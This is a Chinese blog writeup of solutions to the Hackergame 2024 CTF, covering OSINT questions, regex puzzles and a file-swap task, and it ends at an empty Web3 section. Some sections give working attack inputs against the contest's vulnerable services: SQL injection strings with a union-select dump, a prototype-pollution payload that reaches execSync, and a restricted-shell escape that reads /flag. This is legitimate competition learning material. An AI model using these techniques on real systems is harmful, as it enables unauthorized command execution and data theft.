# HackerGame 2024 Writeup

> [!NOTE]
> 博客链接：https://xlog.sxzz.moe/hackergame-2024-writeup

## 写在前面

这几天沉迷 Hackergame 2024，现在终于结束了！ 🥳 我得了 39 名 / 2460 人（🔝1.5%）。

涉及的编程语言有：Python、C（当然，CTF 题目就是 C 和 python 的天下）、JavaScript、Bash、SQL、Rust。

文章略长，请善用 📖 TOC 目录。~~（或直接跳到总结）~~

## 签到

直接点击「马上启动」按钮，会发现 URL 出现了 `?pass=false`。把它改成 true 试试呢？噢通关了！

- http://202.38.93.141:12024/?pass=true
- `flag{WeLCoME-t0-haCk3r9Ame-4nd-enJOY-H4ckiNG-zoZ4}`

## 喜欢做签到的 CTFer 你们好呀

我先找到「中国科学技术大学校内 CTF 战队」是什么，Google 得出是叫做「USTC-NEBULA」战队。继续搜索即可得出「[USTC NEBULA 2024 招新安排](https://github.com/Nebula-CTFTeam/Recruitment-2024)」的 GitHub 仓库。点进 [owner 的 profile](https://github.com/Nebula-CTFTeam)，就可以得到[它的官网](https://www.nebuu.la/)。（不知道为何还有一个 [`USTC-NEBULA`](https://github.com/USTC-NEBULA) org）

### Checkin Again & Again

打开 Chrome DevTools 的 Network panel，直接搜索 `flag` 字样。我们可以看到 `oh-you-found-it`。这表明 flag 就藏在这个页面中。

<img src="https://gist.github.com/user-attachments/assets/c56cc54b-a64b-4482-9593-6d6e6946d163" alt="image" width="600" />

观察搜索到的这处的附近，可以发现一个正则表达式 `/(-a|-al|-la)/i`。

<img src="https://gist.github.com/user-attachments/assets/ebc773ca-cef1-4733-a32e-b056885a05c9" alt="image" width="600" />

嗯，好像是 `ls -al`，输入这个命令，就可以看到有个 `.flag` 文件。直接 `cat .flag` 就能拿到 flag。

（P.S 好像复制不了？直接选择元素，去 Elements panel 复制！💢）

提交看看，诶，不对啊！这怎么是第二题的 flag！🤷

- https://www.nebuu.la/
- `flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}`

### Checkin Again

做完第二小题，我其实是有点怀疑第二题是不是这个页面。为此我还去刚刚的招新安排页面看了看，没发现什么。好吧，继续回到网站。

继续观察刚刚的 js 文件，发现除了刚才找到的字符串，还有一个字符串也很长，还用 `atob` 包起来了！好，让我运行一下康康。

好，本题结束！

- `flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}`

### 官方题解

瞅了一眼官方的题解，发现[比赛主页](https://hack.lug.ustc.edu.cn/)就可以找到中科大校内战队的[链接](https://www.nebuu.la/)。好吧，网站的其他地方我都不看的 🤪

以及执行 `help` 命令其实可以看到有提供 `env` 命令，就直接拿到第一题的 flag。

## 猫咪问答（Hackergame 十周年纪念版）

这题其实完全是考互联网冲浪中的信息搜集了。

> 1. 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？

经过了漫长的 Google 搜索，发现了 LUG 有个[网站](https://lug.ustc.edu.cn/wiki/lug/events/)，记录了很多活动的细节。我们可以在侧边栏看到「信息安全大赛」的页面（也就是 Hackergame）。在活动记录看到了往届的信息，2017 是第四届，倒推一下 2015 也就是第二届。我们也就跳转到了[答案页面](https://lug.ustc.edu.cn/wiki/sec/contest.html)。

> [!NOTE]
> 3A204

> 2. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？

首先我们要知道 2019 ~ 2023 年比赛的题目数量。毫无技巧，纯数数。去[往届的 writeup](https://github.com/orgs/USTC-Hackergame/repositories) 数题目个数，算一下哪个最接近 25。然后会发现怎么没有 2019 的呢！？

继续去互联网信息搜集（俗称 Google），[找到了](https://github.com/ustclug/hackergame2019-writeups)。但为什么就不能放到一个 GitHub org 呢？（难道有什么隐情 🫢）

通过计算发现 2019 年的最接近（写 writeup 的现在已经不想一个一个算了）。

然后去搜索 `hackergame 2019 注册人数`，发现 LUG 有[新闻稿](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/)写了 `总共有 2682 人注册`。

> [!NOTE]
> 2682

> 3. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？

我们知道往届的 writeups 会托管在 GitHub，那不如直接用 GitHub 的搜索引擎试试看？搜索 [hackergame 2018 图书馆 热搜词](https://github.com/search?q=hackergame+2018+%E5%9B%BE%E4%B9%A6%E9%A6%86+%E7%83%AD%E6%90%9C%E8%AF%8D&ref=opensearch&type=code)。本题结束。

> [!NOTE]
> 程序员的自我修养

> 4. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？

把关键词提炼一下，用英语搜索下 `USENIX Security 2024 email spoofing`，Google 会帮我找到 [PDF](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf)。

一开始试了下 `16 * 20 = 320`，发现不对（P.S 这题不像前段时间清北的 Geekgame 2024，答题一次需要防沉迷一个小时）。

后来想了想，不对啊，一共是 16 个服务提供商 + 20 个客户的。服务提供商自己都会提供客户端给用户的（比如说 Gmail 就有自己的 Web 和手机客户端）。那应该是 `16 * 20 + 16=336`。

P.S 官方题解：其实论文里写了，但我没耐心一行一行看。

> [!NOTE]
> 336

> 5. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？

紧跟时事，前段时间网上冲浪有关注这个事件，所以找了一下浏览器历史记录。找到了之前访问的 [commit 页面](https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2)。

> [!NOTE]
> 6e90b6

> 6. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？

```js
import { AutoTokenizer } from '@huggingface/transformers'

const content = await fetch('http://202.38.93.141:13030/', {
  headers: {
    Cookie: 'session=your-session',
  },
}).then((r) => r.text())

const tokenizer = await AutoTokenizer.from_pretrained(
  'meta-llama/Meta-Llama-3-70B',
)
const res = tokenizer.encode(content)
console.log(res.length)
```

为此，我还去 Hugging Face 申请了这个模型的权限。算出来是 `1835`，但这个答案其实是错误的。感觉大模型比较玄学，就 ±3 试了下。

> [!NOTE]
> 1833

好，做完了！

- `flag{Λ_9oØd_C@t_iS_7He_©aT_ωhO_cΛn_PαsS_tHe_qบ!2}`
- `flag{t3И_¥eAЯ5_0ƒ_H@©keRg4M3_om3dE7ØU_WItH_n3Ko_qU1z}`

## 打不开的盒

这其实是我除了签到，第一个解出的题目，一眼就感觉过于简单。

把题目文件下载下来，发现 macOS 可以直接打开它（Thanks to Xcode）。通过不同视角观察内部，可以得到 flag。不过 flag 的最后第二个字符还挺迷惑的，我试了大小写字母 `o` 都不行，才试了下 0️⃣。

- `flag{Dr4W_Us!nG_fR3E_C4D!!w0W}`

## 每日论文太多了！

打开题目的[论文链接](https://dl.acm.org/doi/10.1145/3650212.3652145)，把 [PDF](https://dl.acm.org/doi/pdf/10.1145/3650212.3652145) 下载下来。直接用浏览器搜索 flag 就可以发现有结果，但是肉眼不可见。

那就得抄家伙了，打开讨厌的 Adobe Acrobat，Edit PDF。找到搜索到 flag 的框框，copy 它告诉我们「flag here」。再细心点会发现，有个隐藏的图片也在这，把它拖拽出来。

不过这个画质真的是……一言难尽。又是 flag 中的 hacking，我试了 `l` 不行，大写 `i` 不行。噢原来是 1️⃣。

好，做完了！

- `flag{h4PpY_hAck1ng_3veRyd4y}`

## 比大小王

我第二个做的题目，我的主场是 Web。

直接分析页面源码。发现它会把数据状态存在一个全局变量 `state` 中。我们直接机算出所有 `state.values`。然后等倒数完成后，调用 submit 函数提交。

```js
submit(state.values.map(([a, b]) => (a < b ? '<' : '>')))
```

## 旅行照片 4.0

这个社工题对我来说还是有点难度的，不是很擅长。

### LEO_CHAN?

> **问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：**`X校区Y门`**，均为一个汉字）**

直接在高德地图（嗯，我不用百度地图），搜索「科里科气科创驿站」。会发现科大附近就有[一个地方](https://www.amap.com/detail/B0IAYRYV8C?citycode=340100)，那就决定是你啦！打开图片一看，确实没错。

<p align="center">
  <img src="https://gist.github.com/user-attachments/assets/d3a6e90a-18b1-423b-a5ab-0ba51d81646b" alt="image" width="400" />
  <img src="https://gist.github.com/user-attachments/assets/129f3c17-9f1d-4dff-9dc5-0e3ec605d20e" alt="image" width="400" />
</p>

> [!NOTE]
> 东校区西门

> 问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：`YYYYMMDD`）

搜索 `中科大 ACG 音乐会` 不难找到「[中科大 LEO 动漫协会](https://space.bilibili.com/7021308)」的 B 站账号。挖掘视频不难发现在[这个视频](https://www.bilibili.com/video/BV1TJ4m1A7z3)下的简介。

> [!NOTE]
> 20240519

- `flag{5UB5CR1B3_T0_L30_CH4N_0N_B1L1B1L1_PLZ_??????????}`

题外话：真羡慕高校生活呐

### FULL_RECALL

这题是小红书的软广，~~是不是收了钱？~~

> 问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）

打开第[一张图片](http://202.38.93.141:12345/photos/image01.jpg)，第一眼可以看到垃圾桶上写着「六安园林」，还有就是彩虹跑道。搜索关键词「六安 公园 彩虹」，就能发现[新闻稿](https://www.sohu.com/a/498872898_100023473)，所以应该是「中央公园」和「水上公园」二选一。但其实都不对，搜索「中央公园」可以发现全称是「中央森林公园」

> [!NOTE]
> 中央森林公园

> 问题 4: 这个景观所在的景点的名字是？（三个汉字）

拿着[第二张图片](http://202.38.93.141:12345/photos/image04.jpg)找了半天，还以为也是六安。没想到「而且这两张照片拍摄地的距离……是不是有点远？」是这么远啊……

总之最后用小某书，找到了别人旅游的图文和视频。

> [!NOTE]
> 坛子岭

- `flag{D3T41LS_M4TT3R_1F_R3V3RS3_S34RCH_1S_1MP0SS1BL3_??????????}`

### OMINOUS_BELL

> 问题 5: 距离拍摄地最近的医院是？（无需包含院区、地名信息，格式：XXX 医院）
>
> 问题 6: 左下角的动车组型号是？

这题对我这种对铁路不懂和不感兴趣的真的好难。但题目中提及了 `四编组动车`。去 Google 上找，不难发现 [China EMU](https://www.china-emu.cn/) 这个网站。在[这个页面](https://www.china-emu.cn/Trains/Model/detail-26012-201-F.html)可以发现，它和图片左下角的有点像，都是粉色的涂装。所以型号就是 `CRH6F-A`。

根据「怀密号」搜索，很容易找到 [WikiPedia 上的介绍](https://zh.wikipedia.org/wiki/%E5%8C%97%E4%BA%AC%E5%B8%82%E9%83%8A%E9%93%81%E8%B7%AF%E6%80%80%E6%9F%94%E2%80%94%E5%AF%86%E4%BA%91%E7%BA%BF)，可以知道它在北京北运营。接着根据它运行的线路，用 Google Earth 逐个寻找站点……（好累）。可以找到旁边的医院。

> [!NOTE]
> 积水潭医院
>
> CRH6F-A

- `flag{1_C4NT_C0NT1NU3_TH3_5T0RY_4NYM0R3_50M30N3_PLZ_H3LP_??????????}`

## 不宽的宽字符

我是 C/C++ 语言半吊子，所以靠的是 ChatGPT 打辅助告诉我代码都是什么意思 🤡。

因为这个环境还要用到 Linux x86 + Wine 来模拟在 Windows 上的环境。M1 chip + macOS 真的好难跑起来，遂开了个~~阿里云~~（广告位招租）的云电脑，下了个 Clion 跑起来了。现在环境已经扬了，所以只能靠我的记忆来回忆一下。

以我的知识大概知道：Windows 用的是坑爹的 UTF-16，每个字符占 2~3 个字节。但是普通的 char 只有一个字节。

我们再把 `(char*)filename.c_str()` 打印出来会发现，它会把一个 ASCII 字符拆成两个字节。那我们只需要构造一个字符串，使得每个字拆开正好是 `Z:\theflag` 的 ASCII 字节。

```js
const str = 'Z:\\theflag'
const arr = [...str]
let s = ''
for (let i = 0; i < arr.length; i += 2) {
  s += String.fromCharCode(
    parseInt(
      '0x' +
        arr[i + 1].charCodeAt(0).toString(16) +
        arr[i].charCodeAt(0).toString(16),
    ),
  )
}

console.log(s)
```

得到「㩚瑜敨汦条」，但我们需要用 `\0` 来截断后面添加的 `you_cant_get_the_flag`。所以我们可以随便找个以 `00` 结尾的四位数字符，比如说 `'\u5000'`。我们就可以得到答案「㩚瑜敨汦条倀」。

- `flag{wider_char_isnt_so_great_??????????}`

## PowerfulShell

我们首先看看还剩下什么字符可以用，把键盘上看到的字符都打出来，然后删掉不能用的。我们得到以下字符

```
`, [], {}, _, -, $, 1-9, :, =, +, ~
```

然后去看 Bash 教程，把能用的语法都记一记。

- https://wangdoc.com/bash/expansion#%E6%B3%A2%E6%B5%AA%E7%BA%BF%E6%89%A9%E5%B1%95
  - `~`: HOME 目录
  - `~+` 当前目录（其实和 HOME 目录一样的）
- https://wangdoc.com/bash/string#%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2
  - `${varname:offset:length}`：提取子串，但需要注意的是：只能使用 varname，而不是表达式。因此我们需要把表达式的值存下来。

不能使用字母，那我们如何起一个变量名呢？`_123456789` 是可用的，也是合法的 varname。

这题我特意把做题的日志存下来了，直接看日志吧。

```bash
PowerfulShell@hackergame> _1=~+                        // _1=/players
PowerfulShell@hackergame> _2=${_1:2:1}                 // _2=l
PowerfulShell@hackergame> _3=${_1:7:1}                 // _3=s
PowerfulShell@hackergame> $_2$_3                       // ls
PowerfulShell.sh
PowerfulShell@hackergame> _4=$[1-1]                    // _4=0
PowerfulShell@hackergame> $_2$_3 ${_1:_4:1}            // ls /
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
players
proc
root
run
sbin
srv
sys
tmp
usr
var

PowerfulShell@hackergame> _5=`$_2$_3 ${_1:_4:1}`       // _5=`ls /` (也就是刚刚的结果)
PowerfulShell@hackergame> _6=${_5:15:1}                // _6=c
PowerfulShell@hackergame> _7=${_5:19:1}                // _7=a
PowerfulShell@hackergame> _8=${_5:7:1}                 // _8=t
PowerfulShell@hackergame> $_6$_7$_8 ${_1:_4:1}${_5:17} // cat /
flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_??????????}
cat: home: No such file or directory
cat: lib: No such file or directory
cat: lib32: No such file or directory
cat: lib64: No such file or directory
cat: libx32: No such file or directory
cat: media: No such file or directory
cat: mnt: No such file or directory
cat: opt: No such file or directory
cat: players: No such file or directory
cat: proc: No such file or directory
cat: root: No such file or directory
cat: run: No such file or directory
cat: sbin: No such file or directory
cat: srv: No such file or directory
cat: sys: No such file or directory
cat: tmp: No such file or directory
cat: usr: No such file or directory
cat: var: No such file or directory
PowerfulShell@hackergame>
```

### 后记

其实可以简单点，`~+` 就是 `~`；我们可以直接用 bash 执行任意命令，比 `cat /` 更强大了。

所以，我又做了一遍。

```bash
PowerfulShell@hackergame> _1=~
PowerfulShell@hackergame> _2=${_1:2:1}
PowerfulShell@hackergame> _3=${_1:7:1}
PowerfulShell@hackergame> _4=`$_2$_3 ${_1:1-1:1}`
PowerfulShell@hackergame> _5=${_4:1-1:1}
PowerfulShell@hackergame> _6=${_4:19:1}
PowerfulShell@hackergame> _7=${_4:71-1:1}
PowerfulShell@hackergame> _8=${_4:22:1}
PowerfulShell@hackergame> $_5$_6$_7$_8
cat /flag
flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_??????????}
```

- `flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_??????????}`

## Node.js is Web Scale

Web，熟悉的味道。

打开题目，我花了好久才注意到，最下面有个 `View source code` 的链接 🌚。好吧，我们来看看代码怎么写的。

在 `/execute` 路由可以看到，它用了 `execSync`。那么这里应该就是突破口了。尤其是它的注释写了 `obviously safe` 来挑衅，只能是这里了。

不过它执行的是 `cmds` 对象中预设好的命令，有什么办法我们可以增加新的命令吗？尤其我们可以看到 `/set` 路由，它帮我们处理好了深层属性的设置。噢，原型链攻击！

```js
const a = {}
a.__proto__.evil = 996
a.evil // 996
```

通过上面的代码，可以注入一个 `evil` 的属性到任意的对象中。所以我们只需要设置一次 `key`: `__proto__.evil`, `value`: `ls /`。然后访问 `/execute?cmd=evil`，不难发现有个 flag 文件。把 `value` 改为 `cat /flag`，再访问一遍就拿到 flag 了。

- `flag{n0_pr0topOIl_50_U5E_new_Map_1n5teAD_Of_0bject2kv_??????????}`

## PaoluGPT

又是一个 Web 题目。

### 窥视未知

先把题目下载下来，我们直接锁定 `main.py` 的 67 行！

```python
results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
```

很显然，我们可以注入 SQL 语句。试试 `/view?conversation_id=' or 1=1 --`，果然没问题。我们再看看源码，首页只显示 `shown = true` 的记录，所以我们看看 `shown = false` 的记录。访问 `/view?conversation_id=' or shown=false --`，拿到第二题的 flag！

等等，怎么又是第二题的先做完 🤪！

- `flag{enJ0y_y0uR_Sq1_&_1_would_xiaZHOU_hUI_guo_??????????}` （有 `&amp;` 记得要替换成 `&`）

### 千里挑一

那第一题怎么办？不知道，先把所有数据导出来看看再说！但 python 只把第一条数据取来了，我们可以通过 `union select` 构建出一个子查询，加上 `group_concat` 把所有内容合并成一条数据，一起导出来！

```sql
' union select title, group_concat(contents, ' ') as contents from messages --
```

拿到内容可以发现，除了刚刚的 flag，还有一条 flag 藏在众多的内容中。

- `flag{zU1_xiA0_de_11m_Pa0lule!!!_??????????}`

## 强大的正则表达式

数学题，我的天敌！不会做啊啊啊啊啊啊！

### Easy

通过 ChatGPT 可知，我们只需要关注最后四位数。

> 要在不使用四则运算和任何转换的情况下计算十进制数对 16 取模（即 mod 16），我们可以利用十进制数的性质来简化计算。具体来说，我们只需要关注十进制数的最后四位。这是因为 16 是 2 的 4 次方，所以一个十进制数的最后四位就足以确定其对 16 取模的结果。

所以只需要穷举出所有 4 位数，然后找到 16 的倍数即可。

```js
const arr = new Array(10000)
  .fill(0)
  .map((v, i) => i)
  .filter((v) => v % 16 === 0)
const grouped = Object.groupBy(arr, (v) => String(v).length)

let regex = '(0|1|2|3|4|5|6|7|8|9)*('
regex += grouped[2].map((v) => '00' + v).join('|')
regex += '|'
regex += grouped[3].map((v) => '0' + v).join('|')
regex += '|'
regex += grouped[4].join('|')
regex += ')'

console.log(regex)
```

把这个正则丢到题目环境里，就可以得出 flag。这题有了 GPT 的加持，不算难。

- `flag{p0werful_r3gular_expressi0n_easy_??????????}`

### Medium

通过 Google 搜了下，发现了有人问过[类似的问题](https://stackoverflow.com/questions/7974655/regex-for-binary-multiple-of-3)，不过倍数是 3，我们是 13。

再链接到了[另一个问题](https://codegolf.stackexchange.com/a/3505)，倍数是 7。有人的回答中提到了 DFA（确定有限状态自动机）。也就是说我们可以用 DFA 来解决这个问题。接下来就要请出 ChatGPT 了。

prompt: `帮我构建一个状态机：L = {w | w is a binary representation of an integer divisible by 13 }`

GPT 帮我生成了一个表格来表示状态机。

| 当前状态 | 输入 0 时的状态 | 输入 1 时的状态 |
| -------- | --------------- | --------------- |
| q0       | q0              | q1              |
| q1       | q2              | q3              |
| q2       | q4              | q5              |
| q3       | q6              | q7              |
| q4       | q8              | q9              |
| q5       | q10             | q11             |
| q6       | q12             | q0              |
| q7       | q1              | q2              |
| q8       | q3              | q4              |
| q9       | q5              | q6              |
| q10      | q7              | q8              |
| q11      | q9              | q10             |
| q12      | q11             | q12             |

然后我找到了 [`greenery`](https://pypi.org/project/greenery/) 包，可以用来生成正则表达式。（不过要用旧版本的 v3 才行）

```python
from greenery import fsm, lego

dfa = fsm.fsm(
    alphabet={"0", "1"},
    states={0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12},
    initial=0,
    finals={0},
    map={
        0: {"0": 0, "1": 1},
        1: {"0": 2, "1": 3},
        2: {"0": 4, "1": 5},
        3: {"0": 6, "1": 7},
        4: {"0": 8, "1": 9},
        5: {"0": 10, "1": 11},
        6: {"0": 12, "1": 0},
        7: {"0": 1, "1": 2},
        8: {"0": 3, "1": 4},
        9: {"0": 5, "1": 6},
        10: {"0": 7, "1": 8},
        11: {"0": 9, "1": 10},
        12: {"0": 11, "1": 12},
    },
)
print(lego.from_fsm(dfa))
```

生成的正则表达式包含 `?`，我们需要把它替换成 `*`；把 `{n}` 展开，例如 `1{2}` 替换成 `11`。

- `flag{pow3rful_r3gular_expressi0n_medium_??????????}`

### Hard

这题真的不会做，参考[官方题解](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/%E5%BC%BA%E5%A4%A7%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F#%E9%A2%98%E8%A7%A3)。

## 惜字如金 3.0

好奇怪的东西。

### 题目 A

有手就行，根据题目规则，补全即可。实在不会丢给 ChatGPT。

- `flag{C0mpl3ted-Th3-Pyth0n-C0de-N0w}`

### 题目 B

不会，参考[官方题解](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/%E6%83%9C%E5%AD%97%E5%A6%82%E9%87%91%203.0#%E9%A2%98%E8%A7%A3)

### 题目 C

更不会，同上。

## 看不见的彼方：交换空间

这题是我最后做的一题，但没想到其实不难。

### 小菜一碟

我们需要在最小利用资源的情况下，把 `/home/pwn/A/space/file` 和 `/home/pwn/B/space/file` 交换，所以我这里使用 Rust 来写这个程序。虽然限制了 `chroot`，但我们可以通过 TCP 连接来实现通讯。

考虑到硬盘空间实际上用的是内存，我们不能同时持有两个文件和两个文件的副本。所以 Alice 和 Bob 都需要一边读取数据，一边覆盖掉发送出去的数据。

#### Alice

我们让 Alice 端成为 TCP server。Alice 会先打开文件，然后等待 Bob 连接。
当连接进来后，Alice 会先读取文件的内容，然后发送给 Bob。同时也会接收 Bob 发来的数据，然后写入到刚刚读取的文件的位置。

```rust
// Alice
use std::{
    fs::OpenOptions,
    io::{Read, Write},
    net::TcpListener,
    os::unix::fs::FileExt,
};

fn main() -> std::io::Result<()> {
    let file = OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(false)
        .open("/space/file")?;

    // start tcp server
    let listener = TcpListener::bind("127.0.0.1:8000")?;

    let mut tcp_stream = listener.incoming().next().unwrap()?;
    println!("Connection established: {:?}", tcp_stream);

    const BUFFER_SIZE: usize = 1024;
    let tcp_buf = &mut [0u8; BUFFER_SIZE];
    let file_buf = &mut [0u8; BUFFER_SIZE];
    let mut offset = 0;

    while file.read_exact_at(tcp_buf, offset).is_ok() {
        // read file
        file.read_exact_at(file_buf, offset).unwrap();
        tcp_stream.write_all(file_buf).unwrap();

        // write file
        tcp_stream.read_exact(file_buf).unwrap();
        file.write_all_at(file_buf, offset).unwrap();

        offset += BUFFER_SIZE as u64;
    }

    Ok(())
}
```

#### Bob

几乎就是 Alice 的反向操作。打开后先等一下，然后连接到 Alice。读取文件内容，发送给 Alice。同时也会接收 Alice 发来的数据，然后写入到刚刚读取的文件的位置。

```rust
use std::{
    io::{Read, Write},
    os::unix::fs::FileExt,
    thread::sleep,
};

fn main() -> std::io::Result<()> {
    let file = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(false)
        .open("/space/file")
        .unwrap();

    sleep(std::time::Duration::from_millis(500));

    let address = "127.0.0.1:8000";
    let mut stream = std::net::TcpStream::connect(address).unwrap();

    const BUFFER_SIZE: usize = 1024;
    let tcp_buf = &mut [0u8; BUFFER_SIZE];
    let file_buf = &mut [0u8; BUFFER_SIZE];

    let mut offset = 0;
    while stream.read_exact(tcp_buf).is_ok() {
        // read file
        file.read_exact_at(file_buf, offset).unwrap();
        stream.write_all(file_buf).unwrap();

        // file write
        file.write_all_at(tcp_buf, offset).unwrap();
        offset += BUFFER_SIZE as u64;
    }

    Ok(())
}
```

- `flag{just A p1ece 0f cake_??????????}`

### 捉襟见肘

和上一小题类似，我们用相同的方法先把文件交换过来。但不同的是，Alice 写完之后需要把 `file` 拆成两个文件。Bob 需要存完 `file1` 后，存到 `file2` 上覆盖掉旧数据。

如果不这么干，Bob 文件上将存在 128 MiB 的 `file1` 和 64 MiB 的 `file2`。一共 192 MiB，这样就会超出限制，内存会用尽。Alice 同理。

那最后我们要如何拆分或合并文件，而不会超出内存限制呢？蚂蚁搬家！

对于合并，我们先把 `file2` 的前 1MiB 内容读出来，然后写到 `file1` 的末尾，接着依次按 1MiB 的大小读取 `file2` 剩下的内容 (len + index)，覆盖到 `file2` 的 (0 + index) 的位置。再把 `file2` 的大小截断到 `size - len`，直到最后 `file2` 的长度为 0。最后别忘了把 `file1` 硬连接到 `file`，这样就不会有两倍占用，还不用一点一点拷贝过去了。

对于拆分，我们先把 `file` 的 64MiB 处的 1MiB 内容读出来，然后写到 `file2` 的末尾，接着依次按 1MiB 的大小读取 `file` 剩下的内容 (1MiB + len + index)，覆盖到 `file` 的 (1MiB + 0 + index) 的位置。再把 `file` 的大小截断到 `size - len`。同样的，最后别忘了把 `file` 硬连接到 `file1`。

```rust
fn remove_range(file: &mut File, range: Range<u64>) {
    let file_size = file.metadata().unwrap().len();
    const BUFFER_SIZE: usize = 1024 * 1024;
    let mut buffer = [0u8; BUFFER_SIZE];
    let mut offset = range.start;
    let len = range.end;

    while let Ok(n) = file.read_at(&mut buffer, offset + len) {
        if n == 0 {
            break;
        }
        file.write_all_at(&buffer[..n], offset).unwrap();
        offset += n as u64;
    }
    file.set_len(file_size - len).unwrap();
}
```

#### Alice

```rust
use std::{
    fs::{self, File, OpenOptions},
    io::{Read, Write},
    net::TcpListener,
    os::unix::fs::FileExt,
};

fn main() -> std::io::Result<()> {
    println!("Hello, Alice here");

    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(false)
        .open("/space/file")?;

    // start tcp server
    let address = "127.0.0.1:8000";
    let listener = TcpListener::bind(address)?;
    println!("Server started at {}", address);

    let mut tcp_stream = listener.incoming().next().unwrap()?;
    println!("Connection established: {:?}", tcp_stream);

    const BUFFER_SIZE: usize = 1024;
    let tcp_buf = &mut [0u8; BUFFER_SIZE];
    let file_buf = &mut [0u8; BUFFER_SIZE];
    let mut offset = 0;
    let file_size_128m = file.metadata().unwrap().len();
    let file_size_64m = file_size_128m / 2;

    while file.read_exact_at(tcp_buf, offset).is_ok() {
        // read file
        file.read_exact_at(file_buf, offset).unwrap();
        tcp_stream.write_all(file_buf).unwrap();

        // write file
        tcp_stream.read_exact(file_buf).unwrap();
        file.write_all_at(file_buf, offset).unwrap();

        offset += BUFFER_SIZE as u64;

        if offset == file_size_128m {
            break;
        }
    }

    let file2 = File::create("/space/file2")?;

    let mut offset = 0;
    const BUFFER_SIZE2: usize = 1024 * 1024;
    let file_buf = &mut [0u8; BUFFER_SIZE2];
    while let Ok(n) = file.read_at(file_buf, file_size_64m) {
        if n == 0 {
            break;
        }
        file2.write_all_at(&file_buf[..n], offset).unwrap();
        remove_range(&mut file, file_size_64m..n as u64);
        offset += n as u64;
    }

    // make hard link
    fs::hard_link("/space/file", "/space/file1").unwrap();

    println!("Done from Alice.");
    Ok(())
}
```

#### Bob

对于 Bob，需要记得读完 64MiB 后，切换到 `file2` 上。

```rust
use std::ops::Range;
use std::{fs, fs::File};
use std::{
    io::{Read, Write},
    os::unix::fs::FileExt,
    thread::sleep,
};

fn main() -> std::io::Result<()> {
    println!("Hello Bob here!");

    let path = "/space/file1";
    // let path = "b";
    let file1 = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(false)
        .open(path)
        .unwrap();
    let path = "/space/file2";
    let mut file2 = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(false)
        .open(path)
        .unwrap();
    let mut file = &file1;

    sleep(std::time::Duration::from_millis(500));
    // println!("wake up!");

    let address = "127.0.0.1:8000";
    let mut stream = std::net::TcpStream::connect(address).unwrap();
    // println!("Connected to Server: {:?}", stream);

    const BUFFER_SIZE: usize = 1024;
    let tcp_buf = &mut [0u8; BUFFER_SIZE];
    let file_buf = &mut [0u8; BUFFER_SIZE];

    let mut offset = 0;
    let file_size = file.metadata().unwrap().len();
    let packet_size = file_size * 2;

    while stream.read_exact(tcp_buf).is_ok() {
        if offset == 67108864 {
            file = &file2;
            println!("Bob: switch to file2");
        }

        // read file
        let file_offset = if offset >= 67108864 {
            offset - 67108864
        } else {
            offset
        };
        file.read_exact_at(file_buf, file_offset).unwrap();
        stream.write_all(file_buf).unwrap();

        // file write
        file.write_all_at(tcp_buf, file_offset).unwrap();

        offset += BUFFER_SIZE as u64;
        if offset == packet_size {
            break;
        }
    }

    let mut offset = 0;
    const BUFFER_SIZE2: usize = 1024 * 1024;
    let file_buf = &mut [0u8; BUFFER_SIZE2];
    while let Ok(n) = file2.read_at(file_buf, 0) {
        if n == 0 {
            break;
        }
        file1
            .write_all_at(&file_buf[..n], offset + file_size)
            .unwrap();
        remove_range(&mut file2, 0..n as u64);
        offset += n as u64;
    }
    println!("Bob: Done reading file1 {}", offset);

    // make hard link
    fs::hard_link("/space/file1", "/space/file").unwrap();

    println!("Done from Bob.");
    Ok(())
}
```

- `flag{fa1I0catiIling_1NChains_15fun_??????????}`

### 后记

看了下官方题解，其实用 Linux 的 [fallocate(2)](https://www.man7.org/linux/man-pages/man2/fallocate.2.html) 会更简单些，但我没用过，所以就没想到 🤣。

P.S Rust 萌新，比赛最后几个小时做的，代码写得很烂，别喷！

## ZFS 文件恢复

不会，跳过。macOS 环境太难搭了。

参考[官方题解](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/ZFS%20%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D)。

## 链上转账助手

第一次做 Web 3 相关的题目，挺好玩的。恶补了一下 Solidity，然后就开始写合约了。

首先要用到 [Foundry](https://book.getfoundry.sh/getting-started/installation) 构建环境，需要安装下。

### 转账失败

